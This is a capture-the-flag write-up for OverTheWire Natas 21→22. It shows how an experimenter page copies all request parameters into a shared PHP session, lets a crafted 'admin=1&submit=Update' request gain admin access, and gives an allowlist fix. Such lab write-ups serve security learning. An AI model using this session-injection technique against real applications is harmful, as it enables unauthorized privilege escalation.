# Natas 21 → 22 — OverTheWire

## Objective

The objective of this level is to gain administrator access to Natas 21 and retrieve the credentials for Natas 22.

The application also provides the following hint:

> This website is colocated with `natas21-experimenter`.

---

## 1. Source Code Analysis

The main Natas 21 application contains:

```php
<?php

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
        print "You are an admin. The credentials for the next level are:<br>";
        print "<pre>Username: natas22\n";
        print "Password: <censored></pre>";
    } else {
        print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}

session_start();
print_credentials();

?>
```

The authorization check is based entirely on the server-side session:

```php
$_SESSION["admin"] == 1
```

Therefore, the objective is to obtain a session containing:

```text
admin = 1
```

The Natas 21 application itself does not provide any functionality for setting this value, so the associated experimenter application was examined.

---

## 2. Experimenter Application

The relevant portion of the experimenter source code is:

```php
session_start();

if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
        $_SESSION[$key] = $val;
    }
}
```

The application iterates over every parameter supplied in the request and stores each parameter directly in the PHP session.

For example:

```text
admin=1
```

results in:

```php
$_SESSION["admin"] = "1";
```

The `submit` parameter is required to trigger this code path.

---

## 3. Broken Input Validation

The experimenter defines a list of expected parameters:

```php
$validkeys = array(
    "align" => "center",
    "fontsize" => "100%",
    "bgcolor" => "yellow"
);
```

However, this list is not used to validate the parameters processed by the earlier `foreach` loop.

Instead, the application processes the entire `$_REQUEST` array:

```php
foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
}
```

Consequently, parameters outside the intended set can be injected into the session.

For example:

```text
admin=1
```

creates:

```php
$_SESSION["admin"] = "1";
```

This is the value required by Natas 21's authorization check.

---

## 4. Session Sharing

The level description states that Natas 21 and the experimenter are colocated.

PHP identifies sessions using the `PHPSESSID` cookie.

The session ID assigned by the experimenter was reused when accessing Natas 21. This allows the session data created through the experimenter to be accessed by Natas 21.

The attack can therefore be summarized as:

```text
              Experimenter
                   |
                   | admin=1
                   v
          $_SESSION["admin"] = "1"
                   |
                   | Same PHPSESSID
                   v
               Natas 21
                   |
                   | session_start()
                   v
          $_SESSION["admin"] == 1
                   |
                   v
          Administrator access
```

---

## 5. Exploitation

Using Burp Suite, the request to the experimenter was modified to include the following parameters:

```text
align=center&fontsize=100%25&bgcolor=yellow&admin=1&submit=Update
```

The relevant parameters are:

```text
admin=1
submit=Update
```

`submit=Update` causes the vulnerable code to execute:

```php
if(array_key_exists("submit", $_REQUEST)) {
```

The subsequent loop then stores every supplied parameter in the session:

```php
foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
}
```

This results in:

```php
$_SESSION["admin"] = "1";
```

The same `PHPSESSID` was then used when accessing Natas 21.

Natas 21 loads the session with:

```php
session_start();
```

and evaluates:

```php
$_SESSION["admin"] == 1
```

The condition is satisfied, resulting in administrator access and disclosure of the Natas 22 credentials.

---

## Vulnerability

The root cause is **arbitrary session variable injection caused by insufficient input validation**.

User-controlled request parameters are copied directly into the server-side session:

```php
foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
}
```

Although the application defines `$validkeys`, the list is not used to restrict which parameters can be written to the session.

An attacker can therefore create arbitrary session variables, including security-sensitive variables such as:

```text
admin=1
```

Because the experimenter and Natas 21 share the same session, the injected value can then be used by Natas 21's authorization logic.

---

## Remediation

Only explicitly permitted parameters should be written to the session.

For example:

```php
foreach($validkeys as $key => $default) {
    if(isset($_REQUEST[$key])) {
        $_SESSION[$key] = $_REQUEST[$key];
    }
}
```

This prevents arbitrary parameters such as `admin` from being added to the session.

Additionally, authorization decisions should not rely solely on client-influenced or weakly controlled session state.

---

## Key Takeaways

* PHP session data is server-side, but the session identifier is controlled through the `PHPSESSID` cookie.
* Applications sharing session storage can potentially affect each other's authentication state.
* Defining an input whitelist is ineffective if it is not actually enforced.
* User-controlled parameters should never be blindly copied into security-sensitive session variables.
* Authorization checks should be based on trusted server-side state that cannot be arbitrarily manipulated.

### Tools

* Burp Suite
* Browser Developer Tools
* PHP source-code analysis

### Vulnerability Classification

**Improper Session Handling / Arbitrary Session Variable Injection**
